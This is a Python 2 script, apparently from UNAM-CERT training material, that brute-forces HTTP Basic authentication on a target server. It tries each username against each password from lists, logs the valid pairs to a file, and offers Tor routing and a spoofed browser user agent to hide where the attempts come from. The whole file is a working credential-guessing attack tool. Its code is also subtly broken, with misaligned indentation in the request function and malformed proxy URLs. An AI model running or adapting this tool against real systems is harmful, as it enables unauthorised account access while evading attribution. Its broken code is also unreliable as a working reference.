#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
import requests
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-D', '--users_file', dest='users_file', default=None, help='Get users from the specified file.')
    parser.add_option('-F', '--passwords_file', dest='passwords_file', default=None, help='Get passwords form the specified file.')
    parser.add_option('-o', '--output_file', dest='output_file', default='salida.txt', help='Output file.')
    parser.add_option('-v', '--verbose', dest='verbosee', default=False, help='Show more info about the test process.', action='store_true')
    parser.add_option('-T', '--tor', dest='tor', default=False, help='Make requests through tor.', action='store_true')
    parser.add_option('-A', '--agent', dest='agent', default=False, help='Change user agent.', action='store_true')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def getFileLines(name):
    with open(name,'r') as data_file:
        return [e[:-1] for e in data_file.readlines()]


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def correctInput(user, users, password, passwords):
    if user and users:
        printError('Can\'t specify users file and an user ', True)
    if password and passwords:
        printError('Can\'t specify passwords file and a password ', True)
    
def getCredentials(url, users, passwords, verbose, file_output, tor ,agent):
    with open(file_output, 'w') as fl: 
        if verbose:
            for user in users:
                for password in passwords:
                    print 'Testing user:%s  password:%s '%(user,password)
                    if makeRequest(url, user, password, tor , agent):
                        print '\tCredenciales correctas'
                        fl.write(user+'\t'+password+'\n')
                    else:
                        print '\tCredenciales incorrectas'
        else:
            for user in users:
                for password in passwords:
                    if makeRequest(url, user, password, tor, agent):
                        fl.write(user+'\t'+password+'\n')


def buildData(user, users, password, passwords):
    if user and password:
        return [user],[password]
    elif user and passwords:
        return [user], getFileLines(passwords)
    elif users  and password:
        return getFileLines(users),[password]
    elif users and passwords:
        return getFileLines(users), getFileLines(passwords)
    else:
        printError('Data input error!',True)
    

def makeRequest(host, user, password, tor, agent):

	try:
            if tor:
                
                session =  requests.session()
                session.proxies = {}
                
                session.proxies['http'] = 'socks5h:\\localhost:9050'
                session.proxies['https'] = 'socks5h:\\localhost:9050'
                if agent:
                    headers = {}
                    headers['User-agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17'
                    response = session.get(host,auth=(user,password), headers=headers)
                else:
                    response = session.get(host, auth=(user,password))

            else:
                if agent:
                    headers = {}
                    headers['User-agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17'
                    response = requests.get(host, auth=(user,password),headers=headers)
	        else:
                    response = requests.get(host, auth=(user,password))

            if response.status_code == 200:
                return True
            else:
                return False
	except ConnectionError:
		printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

        

if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        correctInput(opts.user, opts.users_file, opts.password, opts.passwords_file)
        url = buildURL(opts.server, port = opts.port)
        users , passwords = buildData(opts.user, opts.users_file, opts.password, opts.passwords_file)
        getCredentials(url, users, passwords, opts.verbosee, opts.output_file,opts.tor,opts.agent)

        
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
